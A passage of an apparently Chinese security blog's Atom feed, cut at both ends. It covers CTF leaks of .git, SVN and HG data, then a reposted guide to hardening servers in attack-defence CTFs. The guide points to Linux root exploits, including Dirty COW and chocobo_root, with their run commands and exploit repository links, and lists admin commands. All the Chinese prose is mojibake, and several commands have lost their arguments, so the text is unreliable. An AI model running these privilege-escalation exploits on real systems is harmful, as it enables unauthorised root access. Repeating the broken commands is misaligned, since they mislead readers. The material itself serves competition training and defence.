alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/ea656738203d4c96b2b7b5d3d2a8cb38.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="4-Githubæ³„éœ²"><a href="#4-Githubæ³„éœ²" class="headerlink" title="4.Githubæ³„éœ²"></a>4.Githubæ³„éœ²</h3><p><em>a.log</em></p><p>ä¸‹è½½dirsearch<br><img src="https://img-blog.csdnimg.cn/a1f10f6fae044bfb911b11e5115e1545.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">ä¸‹è½½GitHub<br><img src="https://img-blog.csdnimg.cn/d81f0326a8994d43bcb06a0245b4d132.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">å…ˆé€šè¿‡dirsearchæ‰«ææ•æ„Ÿç›®å½•<br><img src="https://img-blog.csdnimg.cn/afd38fb82edd49efabc14ae2628be7c6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">å‘ç°å­˜åœ¨gitæ³„éœ²æ¼æ´<br><img src="https://img-blog.csdnimg.cn/9956f4a871564d8cb70201d452868eff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">å°†gitæ–‡ä»¶ä¿å­˜åœ¨æœ¬åœ°<br><img src="https://img-blog.csdnimg.cn/c098cb34a5574145ba13d7185c7061e6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/fb192f763bb74beca86e5f561743a85d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">æŸ¥çœ‹æ—¥å¿—<br><img src="https://img-blog.csdnimg.cn/e0c180cf7015447aafc3526992945b87.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">æ˜¾ç¤ºå†…å®¹<br><img src="https://img-blog.csdnimg.cn/10319a69e194406f996e622a434cd42d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><em>b.stash</em></p><p>æ–¹æ³•åŒä¸Š<br><img src="https://img-blog.csdnimg.cn/78b610c9efa143adab44197569cb540e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/f35f01f26caf4397b96cd266c27746b3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/56ed985cee054427a3454b6c1dd7d2ef.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><code>git stash list</code>æŸ¥çœ‹æ‰€æœ‰è¢«éšè—çš„æ–‡ä»¶åˆ—è¡¨,<br><code>git stash pop</code>é»˜è®¤æ¢å¤gitæ ˆä¸­æœ€æ–°çš„ä¸€ä¸ªstash@{num}<br>å¼¹å‡ºäº†10707936525229.txtæ–‡ä»¶ï¼Œé‡Œé¢å­˜åœ¨flagæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/ef0a559310404c6799045abe0c7a1ac7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><em>3.index</em><br><img src="https://img-blog.csdnimg.cn/5835b40cbcbc4cfe870fd59b2c538575.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/fd1dd7be768c4e08b028972b115c76a9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="5-SVNæ³„éœ²"><a href="#5-SVNæ³„éœ²" class="headerlink" title="5.SVNæ³„éœ²"></a>5.SVNæ³„éœ²</h3><p><img src="https://img-blog.csdnimg.cn/daa8d4f379794d3a96b18d11d838d6e6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/8fe78e15438d4c69b7092bbcea6b9ece.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/8f2c59d868d14705a93d5a577e499935.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="6-HGæ³„éœ²"><a href="#6-HGæ³„éœ²" class="headerlink" title="6.HGæ³„éœ²"></a>6.HGæ³„éœ²</h3><p><img src="https://img-blog.csdnimg.cn/9ce4a77efa864d8e9a5ab6f8585197a8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/c146fbd4f5ea46728c11833c77029921.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/d052cd071923494b9643405a7197b8ff.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/c6ad340ad9f140b98a45fbbfe1868167.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/4f0d2cdea28e4aeab203240510ad90ee.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTFä¸­çš„ä¿¡æ¯æ³„éœ²&quot;&gt;&lt;a href=&quot;#CTFä¸­çš„ä¿¡æ¯æ³„éœ²&quot; class=&quot;headerlink&quot; title=&quot;CTFä¸­çš„ä¿¡æ¯æ³„éœ²&quot;&gt;&lt;/a&gt;CTFä¸­çš„ä¿¡æ¯æ³„éœ²&lt;/h1&gt;&lt;p&gt;ä¸€èˆ¬å…ˆç”¨dirmapæ‰«ä¸€ä¸‹ï¼Œçœ‹ä¸‹æœ‰æ²¡æœ‰ä¿¡æ¯æ³„éœ²ï¼ŒCTFä¸­ä¸å¤ªå»ºè®®ç”¨å¾¡å‰‘çš„é‚£äº›å­—å…¸ï¼Œå¾ˆ</summary>
      
    
    
    
    <category term="ä¿¡æ¯æ³„éœ²" scheme="https://lhhxs.github.io/categories/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="ä¿¡æ¯æ³„éœ²" scheme="https://lhhxs.github.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>CTFçº¿ä¸‹é˜²å¾¡æˆ˜ â€” è®©ä½ çš„é¶æœºå˜æˆâ€œé“œå¢™é“å£â€</title>
    <link href="https://lhhxs.github.io/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8B%E9%98%B2%E5%BE%A1%E6%88%98%20%E2%80%94%20%E8%AE%A9%E4%BD%A0%E7%9A%84%E9%9D%B6%E6%9C%BA%E5%8F%98%E6%88%90%E2%80%9C%E9%93%9C%E5%A2%99%E9%93%81%E5%A3%81%E2%80%9D/"/>
    <id>https://lhhxs.github.io/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8B%E9%98%B2%E5%BE%A1%E6%88%98%20%E2%80%94%20%E8%AE%A9%E4%BD%A0%E7%9A%84%E9%9D%B6%E6%9C%BA%E5%8F%98%E6%88%90%E2%80%9C%E9%93%9C%E5%A2%99%E9%93%81%E5%A3%81%E2%80%9D/</id>
    <published>2022-09-09T02:08:24.523Z</published>
    <updated>2022-09-09T14:24:03.260Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFçº¿ä¸‹é˜²å¾¡æˆ˜-â€”-è®©ä½ çš„é¶æœºå˜æˆâ€œé“œå¢™é“å£â€"><a href="#CTFçº¿ä¸‹é˜²å¾¡æˆ˜-â€”-è®©ä½ çš„é¶æœºå˜æˆâ€œé“œå¢™é“å£â€" class="headerlink" title="CTFçº¿ä¸‹é˜²å¾¡æˆ˜ â€” è®©ä½ çš„é¶æœºå˜æˆâ€œé“œå¢™é“å£â€"></a>CTFçº¿ä¸‹é˜²å¾¡æˆ˜ â€” è®©ä½ çš„é¶æœºå˜æˆâ€œé“œå¢™é“å£â€</h1><p>å‘å¸ƒäº2018-08-03 10:46:24é˜…è¯» 9850</p><blockquote><p>è¿™ç¯‡æ–‡ç« ç‰¹åˆ«ä¸é”™ï¼Œè¦æ˜¯åœ¨å®‰æ’æ¯æ¯”èµ›ä¹‹å‰å°±çœ‹äº†å°±ä¸ä¼šè¢«æ‰“çš„å¤ªæƒ¨äº†ã€‚</p></blockquote><hr><p><strong>ä¸€. å‰è¨€</strong></p><p>éšç€<a href="https://geekmubai.com/tag/ctf">CTF</a>çš„æ™®åŠï¼Œæ¯”èµ›çš„å½¢å¼ä¹Ÿæœ‰äº†è¶Šæ¥è¶Šå¤šçš„èŠ±æ ·ï¼Œå¯¹äº<a href="https://geekmubai.com/tag/%e7%ba%bf%e4%b8%8b%e8%b5%9b">çº¿ä¸‹èµ›</a>æ¥è¯´ï¼Œå¼€å§‹å‡ºç°äº†å®‰å…¨åŠ å›ºæˆ–è€…<a href="https://geekmubai.com/tag/%e9%98%b2%e5%be%a1">é˜²å¾¡</a>æˆ˜ä¹‹ç±»çš„ç¯èŠ‚ï¼Œäº¦æˆ–è€…å› ä¸ºæ‹¿ä¸‹é¶æœºåä¸å¸Œæœ›å…¶ä»–æ”»å‡»è€…è¿›å…¥è€Œè¿›è¡Œâ€œäº‰å¤ºâ€ï¼Œæ— è®ºä»€ä¹ˆå½¢å¼ï¼Œè¿™äº›éƒ½éœ€è¦æˆ‘ä»¬å¯¹äºæœåŠ¡å™¨çš„é˜²æŠ¤å·¥ä½œæœ‰æ‰€äº†è§£ã€‚å¯¹äº<a href="https://geekmubai.com/tag/%e7%ba%bf%e4%b8%8b%e8%b5%9b">çº¿ä¸‹èµ›</a>ï¼Œç¬”è€…è™½è¯´æ²¡æœ‰ä»€ä¹ˆå¾ˆé«˜è¶…çš„æ”»é˜²æŠ€å·§ï¼Œä½†ä¹Ÿæ˜¯æœ‰ç€ä¸€äº›è‡ªå·±çš„å¿ƒå¾—ã€‚æœ¬æ–‡æ€»ç»“äº†ä¸€äº›<a href="https://geekmubai.com/tag/ctf">CTF</a><a href="https://geekmubai.com/tag/%e7%ba%bf%e4%b8%8b%e8%b5%9b">çº¿ä¸‹èµ›</a>ä¸­å¸¸ç”¨çš„æœåŠ¡å™¨åŠ å›ºå§¿åŠ¿ï¼Œå¸Œæœ›èƒ½å¯¹å„ä½<a href="https://geekmubai.com/tag/ctf">CTF</a>æœ‹å‹ä»¬æœ‰æ‰€å¸®åŠ©ã€‚ç¯å¢ƒé’ˆå¯¹ç›®å‰å¸¸è§<a href="https://geekmubai.com/tag/%e7%ba%bf%e4%b8%8b%e8%b5%9b">çº¿ä¸‹èµ›</a>å¸¸è§çš„linux WebæœåŠ¡å™¨ï¼Œä½†æ˜¯å› ä¸º<a href="https://geekmubai.com/tag/ctf">CTF</a>æ¯•ç«Ÿä¸çœŸå®ç½‘ç»œç¯å¢ƒæœ‰å¾ˆå¤§åŒºåˆ«ï¼Œæœ¬æ–‡çš„æ¶‰åŠçš„å¤§éƒ¨åˆ†å§¿åŠ¿ä¸å…·æœ‰æ™®éé€‚ç”¨æ€§ã€‚æœ¬æ–‡æ¶‰åŠåˆ°çš„ç›¸å…³ä»£ç githubä¸‹è½½åœ°å€ï¼š<a href="https://github.com/ssooking/CTFDefense">CTFDefense</a>ã€‚</p><p><strong>äºŒ. å¸¸ç”¨å§¿åŠ¿</strong></p><p><strong>1. ææƒ</strong></p><p>åœ¨å¼€å§‹æ­£æ–‡ä¹‹å‰ï¼Œéœ€è¦å…ˆæä¸€ä¸‹ææƒï¼Œè¿™ä¸ªè¦æ ¹æ®è‡ªå·±çš„æ¯”èµ›è¿‡ç¨‹ä¸­çš„éœ€è¦è€Œå®šã€‚æœ‰äº›æ¯”èµ›å°±æœ‰ä¸“é—¨çš„<a href="https://geekmubai.com/tag/%e9%98%b2%e5%be%a1">é˜²å¾¡</a>åŠ å›ºç¯èŠ‚ï¼Œä½†å®‰å…¨åŠ å›ºçš„å¾ˆå¤šæ“ä½œéƒ½ä¼šæ¶‰åŠåˆ°rootæƒé™ï¼Œå¦‚æœç›´æ¥ç»™rootæƒé™æœ€å¥½ï¼Œä½†ä¸€èˆ¬ä¸€å¼€å§‹ä¼šç»™ä¸€ä¸ªæ™®é€šæƒé™è´¦å·ï¼Œæˆ–è€…å¹²è„†ä»€ä¹ˆéƒ½ä¸ç»™ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±é€šè¿‡æ¼æ´æ‹¿ä¸‹æœåŠ¡å™¨ï¼Œè¿™æ ·å¾€å¾€å°±éœ€è¦ææƒäº†ã€‚å…³äºææƒï¼Œé€šå¸¸æˆ‘ä»¬è¦æ ¹æ®kernelç‰ˆæœ¬å·æ‰¾åˆ°å¯¹åº”çš„pocï¼Œå¹³æ—¶æˆ‘ä»¬å¯ä»¥æ”¶é›†æµ‹è¯•ä¸€äº›æ¯”è¾ƒæ–°çš„ææƒpocï¼Œä»¥å¤‡ä¸æ—¶ä¹‹éœ€ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªç½‘ç«™ï¼š<a href="http://exploit.linuxnote.org/">http://exploit.linuxnote.org/</a>ï¼Œé‡Œé¢æœ‰è®¸å¤šlinuxæœ¬åœ°ææƒçš„pocã€‚githubä¸Šæœ‰ä¸€ä¸ªæŒºå…¨çš„ææƒexpé¡¹ç›®ï¼š<a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a> ã€‚ç½‘ä¸Šä¹Ÿæœ‰äººåˆ†äº«çš„ä¸€äº›æ‰“åŒ…æœé›†çš„poc,æ¯”å¦‚<a href="https://bbs.77169.com/forum.php?mod=viewthread&tid=363466">è¿™ä¸ª</a>ï¼Œæœ‰å…´è¶£çš„æœ‹å‹å¯ä»¥å¤šä¸‹è½½çœ‹çœ‹ã€‚</p><p>ä¸‹é¢åˆ†äº«å‡ ä¸ªæœ€è¿‘ä¸¤å¹´å¹¶ä¸”å½±å“èŒƒå›´æ¯”è¾ƒå¤§çš„ï¼š</p><p><a href="https://github.com/torvalds/linux/commit/5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4">CVE-2017-6074 (DCCPåŒé‡é‡Šæ”¾æ¼æ´ &gt; 2.6.18 ï¼‰</a></p><p>æè¿°ï¼šDCCPåŒé‡é‡Šæ”¾æ¼æ´å¯å…è®¸æœ¬åœ°ä½æƒé™ç”¨æˆ·ä¿®æ”¹Linuxå†…æ ¸å†…å­˜ï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆç³»ç»Ÿå´©æºƒï¼‰æˆ–è€…æå‡æƒé™ï¼Œè·å¾—ç³»ç»Ÿçš„ç®¡ç†è®¿é—®æƒé™</p><p>ç”¨æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pwn </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">CVE-2016-5195ï¼ˆè„ç‰›ï¼Œkernel 2.6.22 &lt; 3.9 (x86&#x2F;x64)ï¼‰</a></p><p>æè¿°ï¼šä½æƒé™ç”¨æˆ·å¯ä¿®æ”¹rootç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶å†…å®¹ï¼Œå¦‚ä¿®æ”¹ &#x2F;etc&#x2F;passwdï¼ŒæŠŠå½“å‰ç”¨æˆ·çš„ uid æ”¹æˆ 0 å³å¯æå‡ä¸ºrootæƒé™</p><p>ç”¨æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirtyc0w file content </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p><a href="https://github.com/torvalds/linux/commit/f6fb8f100b807378fda19e83e5ac6828b638603a">CVE-2016-8655ï¼ˆUbuntu 12.04ã€14.04ï¼ŒDebian 7ã€8ï¼‰</a></p><p>æè¿°ï¼šæ¡ä»¶ç«äº‰æ¼æ´ï¼Œå¯ä»¥è®©ä½æƒé™çš„è¿›ç¨‹è·å¾—å†…æ ¸ä»£ç æ‰§è¡Œæƒé™</p><p>ç”¨æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chocobo_root </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p>POCï¼š <a href="https://www.seebug.org/vuldb/ssvid-92567">https://www.seebug.org/vuldb/ssvid-92567</a></p><p><a href="https://github.com/c0d3z3r0/sudo-CVE-2017-1000367">CVE-2017-1000367ï¼ˆsudoæœ¬åœ°ææƒæ¼æ´ ï¼‰</a></p><p>CVE-2017-1000364</p><p>æè¿°ï¼šLinux Kernel Stack Clashå®‰å…¨æ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºæ“ä½œç³»ç»Ÿå†…å­˜ç®¡ç†ä¸­çš„ä¸€ä¸ªå †æ ˆå†²çªæ¼æ´ï¼Œå®ƒå½±å“Linuxï¼ŒFreeBSDå’ŒOpenBSDï¼ŒNetBSDï¼ŒSolarisï¼Œi386å’ŒAMD64ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒç ´åå†…å­˜å¹¶æ‰§è¡Œä»»æ„ä»£ç  ã€‚</p><p><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html">CVE-2016-1247ï¼ˆNginxæƒé™æå‡æ¼æ´ï¼‰</a></p><p>æè¿°ï¼šNginxæœåŠ¡åœ¨åˆ›å»ºlogç›®å½•æ—¶ä½¿ç”¨äº†ä¸å®‰å…¨çš„æƒé™è®¾ç½®ï¼Œå¯é€ æˆæœ¬åœ°æƒé™æå‡ï¼Œæ¶æ„æ”»å‡»è€…èƒ½å¤Ÿå€Ÿæ­¤å®ç°ä» nginx&#x2F;web çš„ç”¨æˆ·æƒé™ www-data åˆ° root ç”¨æˆ·æƒé™çš„æå‡ã€‚</p><p>POCï¼š<a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html">https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a></p><p>ææƒç›¸å…³ä»£ç åœ¨GetRootç›®å½•ï¼ŒPOCä¸­æ˜¯ä¸Šé¢æåˆ°çš„å‡ ä¸ªæœ¬åœ°ææƒæºä»£ç ï¼Œreleaseä¸­åˆ†åˆ«æ˜¯ç¼–è¯‘å¥½çš„32ä½å’Œ64ä½ç¨‹åºã€‚</p><p>å®ç”¨è„šæœ¬</p><p><a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester.git">Linux_Exploit_Suggester.pl</a> ï¼Œå®ƒå¯ä»¥æ ¹æ®ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬å·è¿”å›ä¸€ä¸ªåŒ…å«äº†å¯èƒ½exploitsçš„åˆ—è¡¨ã€‚è¿˜æœ‰ä¸€ä¸ªæ£€æŸ¥linuxå®‰å…¨çŠ¶å†µçš„è„šæœ¬ï¼š<a href="http://www.freebuf.com/sectool/108564.html">åŸæ–‡é“¾æ¥</a></p><p>è¿˜æœ‰å‡ ä¸ªè¯¦è§ï¼š<a href="http://www.freebuf.com/sectool/121847.html">Linuxææƒï¼Ÿè¿™å››ä¸ªè„šæœ¬å¯ä»¥å¸®åŠ©ä½ </a></p><p><strong>2. å¸¸ç”¨æ“ä½œå‘½ä»¤</strong></p><p>linuxæ“ä½œæœ‰å¾ˆå¤šå‘½ä»¤ï¼Œä½†æ˜¯çº¿ä¸‹èµ›çš„é˜²æŠ¤å·¥ä½œä¸­å¸¸ç”¨çš„ä¹Ÿå°±é‚£ä¹ˆä¸€äº›ï¼Œæˆ‘ä»¬å¹³æ—¶å¯ä»¥ç•™æ„å¹¶æ€»ç»“èµ·æ¥ï¼Œä¾¿äºæˆ‘ä»¬æ¯”èµ›ä½¿ç”¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ssh &lt;-p ç«¯å£&gt; ç”¨æˆ·å@IPã€€ã€€</span><br><span class="line">scp æ–‡ä»¶è·¯å¾„  ç”¨æˆ·å@IP:å­˜æ”¾è·¯å¾„ã€€ã€€ã€€ã€€</span><br><span class="line">tar -zcvf web.tar.gz /var/www/html/ã€€ã€€</span><br><span class="line">w ã€€ã€€ã€€ã€€</span><br><span class="line">pkill -<span class="built_in">kill</span> -t &lt;ç”¨æˆ·<span class="built_in">tty</span>&gt;ã€€ã€€ ã€€ã€€</span><br><span class="line">ps aux | grep pidæˆ–è€…è¿›ç¨‹åã€€ã€€ã€€ã€€</span><br><span class="line"><span class="comment">#æŸ¥çœ‹å·²å»ºç«‹çš„ç½‘ç»œè¿æ¥åŠè¿›ç¨‹</span></span><br><span class="line">netstat -antulp | grep EST</span><br><span class="line"><span class="comment">#æŸ¥çœ‹æŒ‡å®šç«¯å£è¢«å“ªä¸ªè¿›ç¨‹å ç”¨</span></span><br><span class="line">lsof -i:ç«¯å£å· æˆ–è€… netstat -tunlp|grep ç«¯å£å·</span><br><span class="line"><span class="comment">#ç»“æŸè¿›ç¨‹å‘½ä»¤</span></span><br><span class="line"><span class="built_in">kill</span> PID</span><br><span class="line">killall &lt;è¿›ç¨‹å&gt;ã€€ã€€</span><br><span class="line"><span class="built_in">kill</span> - &lt;PID&gt;ã€€ã€€</span><br><span class="line"><span class="comment">#å°æ€æŸä¸ªIPæˆ–è€…ipæ®µï¼Œå¦‚ï¼š.ã€€ã€€</span></span><br><span class="line">iptables -I INPUT -s . -j DROP</span><br><span class="line">iptables -I INPUT -s ./ -j DROP</span><br><span class="line"><span class="comment">#ç¦æ­¢ä»æŸä¸ªä¸»æœºsshè¿œç¨‹è®¿é—®ç™»é™†åˆ°æœ¬æœºï¼Œå¦‚123..ã€€ã€€</span></span><br><span class="line">iptable -t filter -A INPUT -s . -p tcp --dport  -j DROPã€€ã€€</span><br><span class="line"><span class="comment">#å¤‡ä»½mysqlæ•°æ®åº“</span></span><br><span class="line">mysqldump -u ç”¨æˆ·å -p å¯†ç  æ•°æ®åº“å &gt; back.sqlã€€ã€€ã€€ã€€</span><br><span class="line">mysqldump --all-databases &gt; bak.sqlã€€ã€€ã€€ã€€ã€€ã€€</span><br><span class="line"><span class="comment">#è¿˜åŸmysqlæ•°æ®åº“</span></span><br><span class="line">mysql -u ç”¨æˆ·å -p å¯†ç  æ•°æ®åº“å &lt; bak.sqlã€€ã€€</span><br><span class="line">find / *.php -perm  ã€€ã€€ ã€€ã€€</span><br><span class="line">awk -F:  /etc/passwdã€€ã€€ã€€ã€€</span><br><span class="line">crontab -lã€€ã€€ã€€ã€€</span><br><span class="line"><span class="comment">#æ£€æµ‹æ‰€æœ‰çš„tcpè¿æ¥æ•°é‡åŠçŠ¶æ€</span></span><br><span class="line">netstat -ant|awk  |grep |sed -e  -e |<span class="built_in">sort</span>|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -rn</span><br><span class="line"><span class="comment">#æŸ¥çœ‹é¡µé¢è®¿é—®æ’åå‰åçš„IP</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log | <span class="built_in">cut</span> -f1 -d   | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -k  -r | <span class="built_in">head</span> -ã€€ã€€</span><br><span class="line"><span class="comment">#æŸ¥çœ‹é¡µé¢è®¿é—®æ’åå‰åçš„URL</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log | <span class="built_in">cut</span> -f4 -d   | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -k  -r | <span class="built_in">head</span> - </span><br></pre></td></tr></table></figure><p>å¤åˆ¶</p><p>å†æ¨èä¸¤ç¯‡ç¯‡å®‰å…¨åº”æ€¥æ’æŸ¥æ‰‹å†Œï¼š<a href="https://yq.aliyun.com/articles/177337">åº”æ€¥æ’æŸ¥æ‰‹å†Œ</a> ï¼Œ<a href="https://xianzhi.aliyun.com/forum/mobile/read/2150.html">Linuxåº”æ€¥å“åº”å§¿åŠ¿æµ…è°ˆ</a></p><p><strong>3. æ–‡ä»¶ç›‘æ§é˜²webshell</strong></p><p><a href="https://geekmubai.com/tag/%e9%98%b2%e5%be%a1">é˜²å¾¡</a>webshellï¼Œæˆ‘ä»¬å¯ä»¥ç›‘æ§æˆ‘ä»¬çš„webç›®å½•ï¼Œå¯¹æ–‡ä»¶çš„å¢åŠ æˆ–ä¿®æ”¹ç­‰æ“ä½œè¿›è¡Œé™åˆ¶ç­‰ï¼Œç²—æš´ä¸€ç‚¹çš„è¯ï¼Œå°±ç¦æ­¢ä»»ä½•æ–‡ä»¶äº§ç”Ÿå˜åŒ–ï¼Œæœç»è¢«ä¼ webshellçš„å¯èƒ½æ€§ã€‚</p><p><strong>ï¼ˆ1ï¼‰ä½¿ç”¨ç³»ç»Ÿ chattr +i 